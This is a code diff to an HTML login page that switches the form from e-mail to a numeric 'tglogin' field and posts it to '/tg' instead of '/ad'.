@@ -9,11 +9,10 @@
 <body>
 <div class="login-page">
     <div class="form">
-        <form class="login-form" action="/ad" method="post" id="local" name="login">
-            <input type="email" placeholder="E-mail" name="email" required id="email"/>
+        <form class="login-form" action="/tg" method="post" id="local" name="login">
+            <input type="number" placeholder="Login" name="tglogin" required id="tglogin"/>
             <input type="password" placeholder="Password" name="password" required id="pwd"/>
             <button type="button-code" id="buttoncheck">let me in</button>
-
             <p class="message">Guest?<a href="/" onclick="parent.location='/'">Sign in using phone number</a></p>
             <span id="result" style="display: block; padding: 5px; color: red;"></span>
         </form>
